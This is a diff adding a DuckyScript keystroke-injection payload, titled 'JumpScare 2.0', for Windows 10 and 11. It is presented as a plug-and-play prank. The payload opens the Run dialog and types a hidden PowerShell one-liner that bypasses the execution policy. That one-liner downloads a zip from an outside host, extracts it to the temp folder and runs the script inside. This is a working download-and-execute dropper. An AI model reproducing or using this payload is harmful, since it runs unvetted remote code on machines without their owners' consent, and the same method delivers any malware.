@@ -1,0 +1,14 @@
+REM    Title: JumpScare 2.0
+REM    Author: I am Jakoby
+REM    Description: This is a one liner payload that will execute and wait until a mouse movement is detected and do a jumpscare
+REM    Target: Windows 10, 11
+
+REM    --------------------------------------------------------------------------------------
+REM    THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM    --------------------------------------------------------------------------------------
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/kiv' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
+ENTER
